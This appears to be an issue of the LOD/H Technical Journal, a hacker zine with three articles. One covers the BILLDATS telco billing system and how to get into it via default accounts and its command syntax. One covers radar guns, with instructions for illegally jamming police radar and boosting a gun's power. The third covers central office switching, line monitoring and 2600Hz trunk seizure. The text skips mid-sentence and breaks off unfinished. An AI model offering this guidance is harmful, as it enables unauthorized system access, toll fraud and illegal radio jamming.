We are still alive. This publication is not released on any schedule. Past
attempts at scheduling issues have failed miserably. The editors refuse to
release issues which are not up to our self-defined standards. We have in the
past, and will continue in the future, to accept articles from anyone (e.g.
non LOD) as long as the articles adhere to our basic format and style. The
editors review all articles to verify accuracy and integrity however it may
not be  possible in all cases to check every fact. Plagiarized material is not
acceptable and we make every attempt to verify an article's originality. When
referenced material is used, the source for that material must be clearly
stated. The more articles we receive the sooner each issue is released. There
is a minimum 2 month review and editing period for each article. If you want
to contribute articles contact any member and they will forward articles to
the editors.

There seems to be some confusion as to what writers are (or were) in LOD/H and
what ones aren't. JUST BECAUSE SOMEONE WRITES FOR THIS PUBLICATION DOES NOT
MEAN THEY ARE AN LOD/H MEMBER! Just to clear up any confusion, a current
member list follows:

Lord Havok
Lex Luthor
Prime Suspect
Phase Jitter
Professor Falken
Skinny Puppy

File 06: The History of LOD/H is a short article explaining the origin of the
group. We realize this is of interest to only a few, and most people probably
could care less. However, also included is a list of EVERY member who was ever
in the group. This is to clear up any and all misconceptions about members.
The press, telecommunications and computer security people, law enforcement,
and others can finally get their facts straight [See Issue #3, article 10,
Clearing up the mythical LOD/H Busts for a prime example, and also in the
Network News and Notes section -- first two articles regarding more so called
'LOD BUSTS']. Another purpose is to thwart would-be group impostors. SYSOPS
who give system access to individuals solely because they are a member of some
respected group are urged to verify the hacker's identity as best they can. No
one should be taken on their word alone.

This issue is dedicated to the three (now "retired") members who recently
received visits from our friends and yours, the U.S. Secret Service and
Bell South Security: The Leftist, The Urvile, and The Prophet. Again, see
the Network News and Notes section for the stories.
Although the TJ is distributed to many boards, the inability for any decent
board to consistently remain online prevents us from utilizing "sponsor"
boards as distribution hubs. Therefore, the TJ will be distributed to whatever
boards are around at the time of release. Due to the lack of boards the
newsletter will be distributed in diskette form to those who can help in its
distribution.

==============================================================================


NOTES: This article will hopefully give you a better understanding of how
the billing process occurs. BILLDATS is just one part of the billing picture.
Before I began working for the government, I was a Telco employee and thus,
the information within this article has been learned through experience.
Unfortunately, I was only employed for a few months (including training on
BILLDATS) and am still learning more about the many systems that a telco uses.
There are however, a couple of lists that were compiled and slightly modified
from what little reference material I could smuggle out and my notes from the
training class. This article does require a cursory knowledge of telco and
computer operations (ie. switching, SCCS, UNIX).


INTRODUCTION -
==============

BILLDATS - BILLing DATa System

BILLDATS can be explained in a nutshell by the acronym listed above. If it's
one thing telecommunications providers do well, it's creating acronyms.
Basically, BILLDATS collects billing information (that's why they call it a
Collector) from AMATs (Automatic Message Accounting Transmitters). The AMATs
are situated in or close to switching offices and are connected to BILLDATS
either through dedicated or dial-up lines. BILLDATS can be considered as
the "middleman" in the billing process. The system collects, validates, and
adds identification information regarding origination and destination. This
is then transferred to tape (or transmitted directly) to the RPC (Regional
Processing Center) or the RAO (Revenue Accounting Office). The RPC/RAO
actually processes the billing information. Typically the BILLDATS system is
located in the same or adjoining building (but can be across town) to
the RPC/RAO.

BILLDATS is similar to many other phone company systems (ie. SCCS) as it uses
a combination of software. The software base is UNIX and the BILLDATS Generic
program runs on it. The hardware used is an AT&T 3B20 (this is what 5ESS
switches use).

Some of the more interesting features BILLDATS possesses are:

*        Can be accessed via dialup (always a plus).
*        Runs under UNIX (another plus).
*        Interface with SCCS (yet another plus).
*        Can store about 12 million calls for the first two disks and about
         8 million calls for each additional disk. A total of 6 (675 MB) disks
         can be used.
*        Inserts the sensor type and ID and recording office type and ID onto
         every AMA record that it collects.
*        Capable of collecting information from nearly 600 AMATs.

To better understand how/why you get a bill after making long distance phone
calls, I have delineated the steps involved.

You call Hacker X and tell him all about the latest busts that have occurred,
he exclaims "Oh Shit!" hangs up on you and throws all his hacking information
into the fireplace. The actual call is referred to as a call event. As each
event happens (upon termination of the call) the event is recorded by the
switch. This information is then sent via an AMA Transmitter which formats the
information and then sends it to BILLDATS (commonly called a "Host
Collector"). BILLDATS then provides the information to the RAO/RPC. The
billing computer is located at the RAO/RPC. Do not confuse the actual billing
system with BILLDATS! The billing computer:

*   Contains customer records
*   Credit ratings (in some telcos)
*   Totals and prints the bill
*   Generates messages when customers do not pay (ie. last chance and
    temporary termination of service)

When the billing period is over, (typically 25-30 days), many events (it
depends on how many calls you have made) have accumulated. A bill is then
generated and mailed to you.


COLLECTION -
============

BILLDATS collects information in two ways:

1.       AMATs
2.       Users

AMAT input
----------

BILLDATS collects data from the AMAT either directly from the switch, or from
a front end which performs some processing on the data before giving it to
BILLDATS. The data I am talking about here is usually AMA billing information.
The information is in the usual AMA format (see Phantom Phreaker's article in
the LOD/H Technical Journal, Issue #3 on AMA for formats and other info). As
I said earlier, the recording office and sensor types and IDs have to be
added by BILLDATS. The other information that is transmitted is usually
maintenance data.

The data that is transferred between BILLDATS and an AMAT is accomplished
over either dedicated or dialup lines using the BX.25 protocol. This protocol
has been adopted by the telecommunications industry as a whole. It is
basically a modified version of X.25.

User input
----------

This is simply sysadmin and sysop information.


INSERTED INFORMATION -
======================

Once the information is collected, additional data (mentioned earlier)
must be inserted. The information that BILLDATS inserts into the AMA records
it receives depends on whether the AMAT is a single or multi-switch AMAT.
Either way, the data is passed through the DEP. The DEP is a module which
is part of the LHS (Link Handler Subsystem) that actually inserts the
additional data. It also performs other functions which are rather
uninteresting to the hacker. The LHS manages the x-mission of all the
collected information. This is either through dedicated or dialup lines. The
LHS is responsible for:

*   Logging of statistics as related to the performance of links.
*   Polling of remote switches for maintenance and billing information.
*   Passing information to the DEP in which additional information is
    inserted.
*   Storing billing information.
*   Other boring stuff.


AMATS -
=======

Basically an AMAT is a front end to the switch. The AMAT:

*   Gets AMA information from the switch.
*   Formats and processes the information.
*   Transmits it to BILLDATS.
*   An AMAT can also store information for up to 1 week.

The following is a list of switches and their related AMAT equipment that
BILLDATS obtains billing information from:

1A ESS: This is usually connected to a 3B APS (Attached Processor System) or
        BILLDATS AMAT.
2ESS:   This is connected to an IBM Series 1 AMAT.
2BESS:  Connected to a BILLDATS AMAT.
4ESS:   Connects to 3B APS.
5ESS:   Direct connection.
TSPS 3B:Direct connection.
DMS-10: Connects to IBM Series 1 AMAT.

There are other AMATs/Switches but they must be compatible with the BILLDATS
interface.


ACCESSING BILLDATS -
====================

Even though a system is UNIX based, that doesn't mean that it is a piece of
cake to get into. Surprisingly (when you think about the average Intelligence
Quotient of telco personnel) but not surprisingly (when you consider that the
information contained on the system is BILLING information--the life blood of
the phone company) BILLDATS is a little more secure than your average telco
system, except for the fact the all login IDs are 5 lower case characters or
less. BILLDATS can usually be identified by:

bcxxxx 3bunix SV_R2+

where:

bc = B(ILLDATS) C(ollector).
xxxx = The node suffix. This is entered when the current Generic is installed.
3bunix = This simply indicates that UNIX is running on an AT&T 3Bxx system.
SV_R2+ = Software Version.

The good news is that there is a default username when the system is
installed. The bad news is that upon logon, the system forces you to choose a
password. The default username is not passworded initially. The added security
feature is simply that the system forces all usernames to have passwords. If
it doesn't have an associated password, the system will give you the message:

"Your password has expired. Choose a new one"

A 6-8 character password must then be entered. After this you will be asked
to enter the terminal type. The ones provided are AT&T terminals (615, 4425,
and 5420 models). Once entered a welcome message will probably be displayed:

"Welcome to the South Western Bell BILLDATS Collector"
"Generic 3, Issue 1"
"Tuesday 01 Aug 1989 12:44:44 PM"

dallas>

The BILLDATS prompt was displayed "dallas>" where dallas is the node name.

There are 3 privilege levels within BILLDATS:

1.       Administrator
2.       Operator
3.       UUCP

*   Administrator privs are basically root privs.
*   An account with Operator privs can still do about anything an Admin can do
    except make data base changes.
*   UUCP privs are the lowest and allow file transfer.


Commands
--------

Just like SCCS, UNIX commands can be entered while using BILLDATS. The format
is:

dallas>run-unx:$unix cmd;

All unix commands must be preceded by "run-unx:" and end with a semicolon ";".
The semicolon is the command terminator character (just like Carriage Return).

BILLDATS isn't exactly user friendly, but it does have on-line help. There are
a number of ways that it can be obtained:

dallas> help-?;  or  help-??;  or  ?-help;  or  ??-help;

If you want specific help:

dallas> help-(command name);

I can list commands forever, but between UNIX (commands every hacker should
be familiar with) and help (any moron can use it), you can figure out which
ones are important.


Error Messages
--------------

Just like SCCS, BILLDATS has some rather cryptic error messages. There are
thousands of error messages, once you know a little about the format they
are easier to understand. When a mistake is made, something similar to
the following will appear:

UI0029      (attempted command) is not a valid input string.

  ^                   ^- error message information
  |
  |--  This is the subsystem and error message number

The following is a brief description of subsystem abbreviations:

BD: BILLDATS system utilities. Errors associated with the use of utility
    programs will be displayed.
DB: Data Base manager. These messages are generated when accessing or
    attempting to access the various Data Bases (explained later) within
    BILLDATS.
DM: Disk Manager. Basically, information pertaining to the system disk(s).
EA: Error and Alarm. As the name implies, system errors and alarms.
LH: Link Handler. Messages related to data link activity, either between
    BILLDATS and the AMAT or BILLDATS and the RAO/RPC.
SC: Scheduler. The scheduler is BILLDATS' version of the UNIX cron daemon.
    BILLDATS uses cron to schedule things like when to access remote systems.
TW: Tape Writer. Messages related to storing billing information on tapes
    which will then be transported to the RAO/RPC.
UI: User Interface. This was used in the above example. Displays syntax,
    range or status errors when entering commands.
DL: Direct Link. Instead of BILLDATS information being written to tape, a
    direct link to the RPC/RAO mainframe (the actual billing system computer)
    can be accomplished. This is usually done when BILLDATS is located far
    away from the RPC/RAO office as there is always some risk involved in
    transporting tapes, and that risk increases the farther away the two
    offices are. Another neat thing about Direct Link is that the billing data
    can be sent across a LAN (Local Area Network) also. Obviously this incurs
    some concerns regarding security, but from what I have heard and seen,
    AT&T and the BOC's typically choose to ignore the security of their
    systems which suits me just fine. The Direct Link is an optional BILLDATS
    feature and if it is in use, messages related to its operation are
    displayed with the DL prefix.


BILLDATS DATA BASES -
=====================

The databases contain all kinds of useful information such as usernames,
switch types, scheduled polling times, etc.

The AMAT Data Base contains:

*   Type of switch
*   Sensor type and identification
*   AMAT phone number
*   Channel and port number/group
*   Other boring information

The Port Data Base contains:

*   Communications information (like L-Dialers on UNIX Sys. V)
*   Channel and port information
*   Other boring information

The Collector Data Base contains:

*   Collector office ID
*   Version number of the Data Base
*   Number and speed of any remote terminals
*   When reports are scheduled for output
*   Other boring information


CONCLUSION -
============

If you are not technically oriented, I hope this article helped you understand
how you get your bill. I assumed that you would skip over the commands for
using BILLDATS and similar information.

If you are technically oriented, I hope I not only helped you understand more
about the billing process, but also increased your awareness of how detailed
the whole process is. And if you do happen to stumble onto a BILLDATS system,
you have been pointed in the right direction as far as using it correctly is
concerned.

I tried to leave out all the boring details, but some may have slipped by me.
I reserved the right to omit specific details and instructions regarding any
alteration or deletion of calls/charges for my own use/abuse.

-----------------------------------------------------------------------------

   Anyone who has driven a car without a radar detector before, has gotten
that paranoid feeling that the cops are around radaring.  This feeling is not
a nice one; it is the feeling that somewhere somehow someone is watching you.
In this article I will attempt to explain how radar guns work, what bands
the guns work on, why they are wrong 70% of the time, how to employ stealth
technology in defeating the radar, and last but not least jamming the radar.

   RADAR stands for RAdio Detecting And Ranging.  A speed-radar gun works
under the Doppler theory.  This theory is that when a signal is reflected off
an object moving toward you, the signal will be at a higher frequency than the
initial frequency, this increase in frequency is used to calculate speed.
Many of you have experienced the Doppler effect, which occurs when a noise
from a siren increases in strength (gets louder) as it approaches and
decreases in strength (gets softer) as it moves away from you.

   Right now in the United States, there are three bands that are Federal
Communication Commission (FCC) certified for "field disturbance sensors",
known to you and me as radar guns.  These bands have proper non-technical
names, and all operate in the GigaHertz range.  GigaHertz is a measure of
frequency; one GHz equals one billion cycles per second.  Most frequency
modulation (FM) radio broadcasts are made in the 0.088 GHz to 0.108 GHz band,
in MegaHertz that is 88 MHz to 108 MHz.  The three proper names for these
radar bands are: X, K, and Ka.

   One of the older radar bands is the X band.  X band radar is the most
commonly used radar band in the United States.  X band radar transmits its
signal at 10.5250 GHz.  The wattage of the radar's signal really depends upon
the gun manufacturer.  However, most manufacturers agree that a 100 milliwatt
signal is "High-Power" and the 40 milliwatt range is "Low Power".  The gun's
range also depends upon the manufacturer.  The average maximum range of a X
band gun is 2500 feet.  That estimate is based on the assumption that the gun
is operating at full-strength (100mw).  Most radar detectors give off a
false signals on this band due to ultrasonic motion detectors employed
by various burglar alarm systems.  Large grocery stores also use these to
open the doors magically as you walk in or out.

   Another older band is K band.  K band operates on 24.150 GHz and is not as
popular as X band, but it is gaining in usage throughout the country.  The
normal signal strength of K band guns again depends upon the manufacturer,
but the ones I've seen all operate at 100 milliwatts at high-power.  These
guns have a maximum range of 3000 feet, assuming they are at 100mw signal
strength.

   A new type of radar has been introduced and assigned a frequency by the
Federal Communications Commission.  This new band has been assigned the name
Ka and has been designated a frequency of 34.360 GHz.  Current Ka technology
gives the gun a maximum effective range of 40 to 200 feet.  This band
was originally made for use with photo-radar.  The photo-radar can be set up
on a tripod on the side of the road or in the back of a police car.  The
user then triggers a button when he wants a car in the guns range
clocked, automatically taking a picture of the car & license plate.
At the time the photograph is taken a date and time is imprinted on the
picture.  The police keep one duplicate for archival purposes and sends the
other to the registered owner of the car along with ticket information and the
amount due.   This type of system can only work in places that hold the owner
of a vehicle responsible for any violations that occur with the car.  The
legal barriers for photo radar to overcome are extensive, most notably, not
giving the vehicle owner due process and the presumption of guilt.  There is
a system out now for $19.95 that defeats Ka band photo radar.  I expect it to
be illegal VERY QUICKLY once Ka is more widely used.  This little baby slips
over your license plate and acts as venetian blinds.  When looking straight at
the plate it looks like a normal plate with a black frame.  However when
looking at it from a Ka band Photo Radar's angle it looks like a license plate
with a silver streak covering the whole plate, making it impossible to
identify.  This device is called the Photobuster and is available from
most radar detector specialty stores.

   There are two different types of radar guns.  They are Instant-On/Pulse and
Constant Broadcasting Radar.  The names are self-explanatory, but I will
explain them anyway.  The constant broadcast radar continually transmits
its radar signal, and anything in its path will be clocked.  Instant-On &
Pulse radars are basically identical, and are both very deadly since they are
harder to detect as a threat.  The Instant-On gun is really nothing more than
an ON/OFF switch for signal transmission.  In order to have a pulse gun, all
a cop has to do is purchase one with a "HOLD" feature or just turn the gun
on when he/she wishes to use it.  The "HOLD" feature is simply a button that
keeps the gun on but makes sure no signal is being transmitted.  No one can
detect a gun that is off or in "HOLD" mode.  An officer using an Instant-On
radar gun will periodically check the speed of the traffic.  These samplings
can easily be detected and will give the user of a detector prior warning to
a Instant On/Pulse activated radar gun.

   Many detectors on the market today provide anti-falsing circuitry.  Falsing
is the triggering of the radar detector from something other than a radar gun.

   One or two detector manufactures make their detectors with GaAs diodes.
GaAs diodes are Gallium Arsenide diodes which are a military grade electrical
component that helps produce a good signal-to-noise ratio.

   All new model radar detectors use Superheterodyne technology.
Superheterodyne, also known as active technology, amplifies all incoming
signals hundreds of times, which makes it more sensitive and selective as to
which signals will trigger an alert.  Superheterodyne technology also gives
out a minute internal radar signal of its own, which can be picked up by older
(Pre/Early 1980's) non-anti-falsing radar detectors.  If you have a newer
model radar detector, this small internally generated signal is no problem to
your's or anyone's anti-falsing radar detecting unit.  NOTE: In states
where radar detectors are illegal (Ex. Virginia, Canada) the police have
devices which detect this Superheterodyne signal.  Police can then stop
you and confiscate your detector.  Getting around this police tactic
would be to use an early radar detector without Heterodyne/Superheterodyne
detection technology.

   Many compact/shirt pocket radar units are "exclusively made with SMD's".
These SMD's are Surface Mounted Devices and contain extremely small resistors,
transistors, diodes, and capacitors.  Just because a manufacturer uses SMD's,
that does NOT make the unit any better than a larger detector of the same age.

   Cincinnati Microwave Inc., the makers of Escort and Passport say they have
the exclusive technology for the detection and anti-falsing of RASHID VRSS
technology.  RASHID VRSS is actually the Rashid Radar Safety Brake Collision
Warning System.  It is an electronic device that operates on K band
frequencies and warns heavy trucks and ambulances of hazards in their path.
About 900 RASHID VRSS units have been prototyped in three states.  Since the
number of actual operating RASHID units is so minute, I really doubt you will
run into one.

   There are two ways a radar gun can produce an incorrect speed reading.
These are known as the Cosine Error and Moving Radar Error.  The Cosine Error
occurs when a radar gun gives a lower reading than the actual speed of the
target.  This occurs because the gun can only measure the doppler shift that
occurs directly towards or away from the antenna.  If the object moves at an
angle to the gun, the shift will be lower than if it moves directly at the
antenna.  Therefore the reading the radar gun gives will be less than the
actual speed of the object.  The radar reading can be calculated by taking
the Actual Speed times the cosine of the incidence angle.  So if the target
car's actual speed is 50 miles per hour and it is 37 degrees off of the
mainline radar signal, the radar speed will be 40 miles per hour. Look:

Cosine Error Theory:
Actual Speed  x  Cosine of Incidence Angle  =  Radar's Shown Speed

Cosine of 37 degrees is 0.80
50 MPH  x  0.80  =  40 MPH

So if you see a radar enabled cop coming head-on towards you it would be a
good idea to get into the right hand lane, or further if possible, as this
increases the angle and thus lowers your radar speed.  The other error is the
Moving Radar Error, which occurs only when a police car is using a moving
radar gun.  A false reading is obtained by the unit because before it
can radar you it must radar something along side the road to get the patrol
car's speed.  Most often, billboards and parked cars are used for this initial
patrol car speed calibration.  It is susceptible to errors because of the
Cosine Error, mentioned above.  Once the patrol car has its speed (wrong or
not), it assumes that the target's (YOU) speed is the difference between the
highest oncoming signal and the patrol speed; but if the patrol speed is lower
it will ADD that error on to the target speed.  So the target speed (YOU) will
read higher than you were actually traveling.  Here's the theory and a
problem:

Moving Radar Theory:
Closing Speed  -  Patrol Speed  =  Target Speed

The ACTUAL speeds for these are:
Patrol Car Speed - 60 MPH
Target Car Speed - 60 MPH
Closing Speed - 120 MPH

Due to the Cosine Error the TARGET CAR's speed will cause the gun to
calculate a LOW reading for the actual patrol car's speed due to the cosine
error.

The RADAR calculated speeds are:
Patrol Car Speed - 50 MPH
Target Car Speed - 70 MPH
Closing Speed - 120 MPH

Thus you can see how the police car is going to get an incorrect reading.
This is a good one to memorize and bring into court for any tickets.

   It's been recently brought to my attention that there are stealth-bras for
cars.  From what I understand, the bras actually absorb the radar, and reflect
such a weakened signal that the radar gun cannot detect it.  I have not seen
one of these in person, but from what I have heard they are made out of a VERY
DENSE rubber/metal composite.  The bra probably traps the signal very much
like the F-117/B-2 stealth aircraft do.  The material is probably made up of
hexagonal shaped cells, the back of the cell being at a slight angle, so that
any signal coming into the cell will have to bounce around within the cell
before exiting it.  The inside of each cell is filled with a radar absorbing
material.  As the signal hits the back of the hexagonal cell it is bounced
around inside the cell through the absorbing material, weakening the signal
each time it does so.  Upon leaving the cell, the signal is so weak the
radar's receiver may not pick up the signal until the target is near enough
to give a positive return on the radar screen.  When the aircraft is getting
closer, within radar range, the signal reflected may be so small the radar's
controller may think he is picking up ground interference, a flock of birds
or possibly bad weather.  The actual radar absorbing material is classified at
this time by the government.  The actual composite on the car bra is certainly
not as good as the actual radar absorption material of the aircraft, but I'm
sure it is somewhat similar.

   Radar jamming is done very much the way any other type of radio jamming is
done.  You simply overpower the frequency being used with a frequency of your
own.  Radar jamming/overpowering is ILLEGAL in the United States.  To jam a
signal all you need is a transmitter, an amplifier and an antenna.  To jam a
gun using a K band radar (24.150 GHz) all you do is get a transmitter that can
transmit in the 20 GHz range and a 10-100 watt amplifier and antenna.  Send
out a signal at around 24.05 GHz.  This signal will make the cop's radar
either show a 0 or an incredibly slow speed such as -520.  Usually the
cop's radar cannot show a negative sign, so it will just be 520.  This
10-100 watt signal that you are transmitting will overpower the signal
his/her radar sent out and is waiting to receive.   His/her gun is only at
100 milliwatts, and you're transmitting at 10-100 watts; its like using a
12-gauge shotgun against a rodent.

   Where can you get microwave transmission equipment?  You can check local
electronic shops, satellite stores, Cable TV companies and local television
stations as to where they buy their microwave transmission gear.  Or you can
buy a radar gun of your own, and leave it ON whenever your driving.  This will
give the cop's gun a very strange reading, most likely zero. If it is
possible, once you have the gun bring it to a "corrupt" electronics shop and
have it modified for high powered transmission, preferably in the 10 to 100
watt range.

   Some radar guns have resistors implemented just before the antenna, but
just after the amplifier for de-amplification of the transmitter's signal.
This means that most guns already have a good (1 watt or so) transmit
capacity, but it is suppressed to bring the actual transmit signal to the
100mw area.  The owner of the gun only has to know which resistors to take
out, then he/she will have a functional high powered gun.  If this small
wattage does not satisfy you, you may have to purchase a separate amplifier
for the gun, and have it wired directly into the radar's transmitter antenna.
This modification is expensive not to mention illegal, but then again what the
hell isn't these days.  I have seen six different types of guns offered from
National Radar Exchange.  The following are a few major radar gun
manufacturers that are sold out of most radar shops. They are:

KUSTOM SIGNAL:
Kustom Signal HR-12  K Band 100mw signal 2000-3000 foot maximum range $695.00
Kustom Signal HR-8   K Band 100mw signal 1800-3000 foot maximum range $495.00

CMI INC.:
Speedgun One  X Band 100mw signal 1000-2500 foot maximum range $395.00
Speedgun Six  X Band 100mw signal 1000-2500 foot maximum range $495.00
(Since these units are the same, the only differences are things like
last speed reading recall, 10 number memory, etc.)

MPH INC.:

MPH K-55  X Band 40mw signal 1200-2500 foot maximum range $495.00
(Can clock target in 1/2 second, which is exceptionally fast for radar guns)

The only differences between the models are their bands and their options,
such as a "HOLD" button, last speed recorded etc.

   I have found these to be some of the top units in the radar detector world
   currently and are listed as follows:

MOST SENSITIVE   MOST FEATURES   BEST LOOKING   MOST RELIABLE    SMALLEST
--------------   -------------   ------------   -------------  -------------
COBRA 4120       COBRA 4120      Whistler 3SE   ESCORT         Uniden RD-9XL
BEL 944          COBRA 3160      BELL 944       K40            Whistler 3SE
Snooper 6000     BELL 944        Uniden RD-9XL

 BEST VALUE         LOUDEST           BEST FILTERED
------------     --------------    ------------------
Snooper 4000     COBRA 5110        Snooper 6000
Cobra 5110       COBRA 3120        Other Snoopers
Cobra 3168       Whistler Q2002
Maxon RD25

   I did not get to see Cincinnati Microwave's new "SOLO", nor BEL's
"Vector 3", "Express", nor it's newer "Legend 3."

Just because a detector is the MOST sensitive doesn't mean it is the best
detector.  Because of the sensitivity you could pick up more alarms.  What
you want is a detector with excellent sensitivity, but good anti-falsing
circuitry.

   I hope this article has given you some insight on how radars work and
how their tickets CAN be defeated.  Keep safe and sane,

    Did I get your attention? Good, everyone should read this. With the time,
effort, and balls it has taken me compile this knowledge it is certainly worth
your time. I hope you appreciate me taking the time to write this.

    I should point out that the information in this article is correct to the
best of my knowledge. I'm sure there are going to be people that disagree
with me on some of it, particularly the references to tracing. However, I
have been involved in telecommunications and computers for 12+ years.

    I'm basing this article around the 1AESS since it is the most common
switch in use today.


     ** OUTSIDE PLANT **

    This is the wiring between your telephone and the central office. That is
another topic in itself. If you are interested read Phucked Agent 04's article
on The Outside Loop Distribution Plant (OLDP) in the LOD/H Technical Journal,
Issue #1. The article explains those green boxes you see on street corners,
aerial cables, manholes etc. So where that article stops, this one starts.


     ** CABLE VAULT **

     All of the cables from other offices and from subscribers enter the
central office underground. They enter into a room called the cable vault.
This is a room generally in the basement located at one end or another of the
building. The width of the room varies but runs the entire length of the
building. Outside cables appear through holes in the wall. The cables then run
up through holes in the ceiling to the frame room.

     Understand that each of these cables consist of an average of 3600 pairs
of wires. That's 3600 telephone lines. The amount of cables obviously depends
on the size of the office. All cables (e.g. interoffice, local lines, fiber
optic, coaxial) enter through the cable vault.


     ** FRAME ROOM **

     The frame is where the cable separates into individual pairs and attach
to connectors. The frame runs the length of the building, from floor to
ceiling. There are two sides to the frame, the horizontal side and the
vertical side. The vertical side is where the outside wiring attaches and the
protector fuses reside. The horizontal side is where the connectors to the
switching system reside. Multi-conductor cables run from the connectors to
actual switching equipment. So what we have is a large frame called the Main
Distribution Frame (MDF) running the entire length of the building. From floor
to ceiling it is 5 feet thick. The MDF consists of two sides, the VDF and the
HDF. Cables from outside connect on one side and cables from the switching
equipment connect to the other side and jumper wires connect the two. This way
any piece of equipment can be connected to any incoming "cable pair". These
jumper wires are simply 2 conductor twisted pair, running between the VDF and
the HDF.

     What does all this mean? Well if you had access to COSMOS you would see
information regarding cable and pair and "OE" (Office Equipment). With this
information you could find your line on the frame and on the switch. The VDF
side is clearly marked by cable and pair at the top of the frame, however the
HDF side is a little more complicated and varies in format from frame to frame
and from switch to switch. Since I am writing this article around the 1AESS,
I will describe the OE format used for that switch.

    OE  ABB-CDD-EFF

   Where..

      A = Control Group (when more than one switch exists in that C.O.)
      B = LN  Line Link Network
      C = LS  Line Switching Frame
      D = CONC or CONCentrator
      E = Switch (individual, not the big one)
      F = Level

    There is one more frame designation called LOC or LOCation. This gives the
location of the connector block on the HDF side. Very simply, looking at the
frame:


H  ---------------------------------------------------------------------

G  ---------------------------------------------------------------------

F  ---------------------------------------------------------------------

E  ---------------------------------------------------------------------

D  ---------------------------------------------------------------------

C  ---------------------------------------------------------------------

B  ---------------------------------------------------------------------

A  ---------------------------------------------------------------------

   123456789 etc.

    Please note that what you are looking at here represents the HDF side of
the MDF, being up to 100 feet long, and 20 feet high. Each "-" represents a
connector block containing connections for 4 x 24 (which is 96) pairs.

    So far I've covered how the wires get from you to the switching
equipment. Now we get to the switching system itself.


    ** SWITCHING SYSTEMS **

    Writing an article that covers them all would be lengthy indeed. So I am

    How much does a switch cost? A fully equipped 5ESS for a 40,000
subscriber end office can cost well over 3 million dollars. Now you know why
your phone bill is so much. Well...maybe you parents bill.


    ** The 1ESS and 1AESS **

    This was the first switch of it's type put into widespread use by Bell.
Primarily an analog switch under digital control, the switch is no longer
being manufactured. The 1ESS has been replaced by the 5ESS and other full
scale digital switches, however, it is still by far the most common switch
used in today's Class 5 end offices.

    The #1 and 1A use a crosspoint matrix similar to the X-bar.  The primary
switch used in the matrix is the ferreed (remreed in the 1A).  It is a two
state magnetic alloy switch.  It is basically a magnetic switch that does not
require voltage to stay in it's present position. A voltage is only required
to change the state of the switch.

   The No. 1 utilized a computer style, common control and memory.  Memory
used by the #1 changed with technology, but most have been upgraded to RAM.
Line scanners monitor the status of customer lines, crosspoint switches,
and all internal, outgoing, and incoming trunks, reporting their status to
the central control.  The central control then either calls upon program or
call store memories to chose which crosspoints to activate for processing the
call.  The crosspoint matrices are controlled via central pulse distributors
which in turn are controlled by the central control via data buses.  All of
the scanner's AMA tape controllers, pulse distro, x-point matrix, etc., listen
to data buses for their address and command or report their information on
the buses. The buses are merely cables connecting the different units to the
central control.

   The 1E was quickly replaced by the 1A due to advances in technology. So
1A's are more common, also many of the 1E's have been upgraded to a 1A.
This meant changing the ferreed to the remreed relay, adding additional
peripheral component controllers (to free up central controller load) and
implementation of the 1A processor.  The 1A processor replaced older style
electronics with integrated circuits.  Both switches operate similarly.
The primary differences were speed and capacity.  The #1ESS could process
110,000 calls per hour and serve 128,000 lines.

    Most of the major common control elements are either fully or partially
duplicated to ensure reliability. Systems run simultaneously and are checked
against each other for errors. When a problem occurs the system will double
check, reroute, or switch over to auxiliary to continue system operation.
Alarms are also reported to the maintenance console and are in turn printed
out on a printer near the control console.

    Operation of the switch is done through the Master Control Center (MCC)
panel and/or a terminal. Remote operation is also done through input/output
channels. These channels have different functions and therefore receive
different types of output messages and have different abilities as for what
type of commands they are allowed to issue. Here is a list of the commonly
used TTY channels.

   Maintenance     - Primary channel for testing, enable, disable etc.
   Recent Change   - Changes in class of service, calling features etc.
   Administrative  - Traffic information and control
   Supplementary   - Traffic information supplied to automatic network control
   SCC Maint.      - Switching Control Center interface
   Plant Serv.Cent.- Reports testing information to test facilities

    At the end of this article you will find a list of the most frequently
seen Maintenance channel output messages and a brief description of their
meaning. You will also find a list of frequently used input messages.

    There are other channels as well as back ups but the only ones to be
concerned with are Recent Change and SCC maint. These are the two channels
you will most likely want to get access to. The Maintenance channel doesn't
leave the C.O. and is used by switch engineers as the primary way of
controlling the switch. During off hours and weekends the control of the
switch is transferred to the SCC.

    The SCC is a centrally located bureau that has up to 16 switches
reporting to it via their SCC maint. channel. The SCC has a mini computer
running SCCS that watches the output of all these switches for trouble
conditions that require immediate attention. The SCC personnel then have the
ability to input messages to that particular switch to try and correct the
problem. If necessary, someone will be dispatched to the C.O. to correct the
problem. I should also mention that the SCC mini, SCCS has dialups and access
to SCCS means access to all the switches connected to it. The level of access
however, may be dependent upon the privileges of the account you are using.

    The Recent Change channels also connect to a centrally located bureau
referred to as the RCMAC. These bureaus are responsible for activating lines,
changing class of service etc. RCMAC has been automated to a large degree by
computer systems that log into COSMOS and look for pending orders. COSMOS is
basically an order placement and record keeping system for central office
equipment, but you should know that already, right? So this system, called
Work Manager running MIZAR logs into COSMOS, pulls orders requiring recent
change work, then in one batch several times a day, transmits the orders to
the appropriate switch via it's Recent Change Channel.

    Testing of the switch is done by many different methods. Bell Labs has
developed a number of systems, many accomplishing the same functions. I will
only attempt to cover the ones I know fairly well.

    The primary testing system is the trunk test panels located at the switch
itself. There are three and they all pretty much do the same thing, which is
to test trunk and line paths through the switch.

         Trunk and Line Test Panel
         Supplementary Trunk Test Panel
         Manual Trunk Test Panel

     MLT (Mechanized Loop Testing) is another popular one. This system is
often available through the LMOS data base and can give very specific
measurements of line levels and losses. The "TV Mask" is also popular giving
the user the ability to monitor lines via a call back number.

    DAMT (Direct Access Mechanized Testing) is used by line repairmen to put
tone on numbers to help them find lines. This was previously done by Frame
personnel, so DAMT automated that task. DAMT can also monitor lines, but
unfortunately, the audio is scrambled in a manor that allows one only to tell
what type of signal is present on the line, or whether it is busy or not.

    All of these testing systems have one thing in common: they access the
line through a "No Test Trunk". This is a switch which can drop in on a
specific path or line and connect it to the testing device. It depends on
the device connected to the trunk, but there is usually a noticeable "click"
heard on the tested line when the No Test Trunk drops in. Also the testing
devices I have mentioned here will seize the line, busying it out. This will
present problems when trying to monitor calls, as you would need to drop in
during the call. The No Test Trunk is also the method in which operator
consoles perform verifications and interrupts.


    ** INTEROFFICE SIGNALLING **

    Calls coming into and leaving the switch are routed via trunks. The
switches select which trunk will route the call most effectively and then
retransmits the dialed number to the distant switch. There are several
different ways this is done. The two most common are Loop Signaling and CCIS,
Common Channel Interoffice Signaling. The predecessor to both of these is the
famous and almost extinct "SF Signaling". This utilized the presence of
2600hz to indicate trunks in use. If one winks 2600Hz down one of these
trunks, the distant switch would think you hung up. Remove the 2600, and you
have control of the trunk and you could then MF a number. This worked great
for years. Assuming you had dialed a toll free number to begin with, there
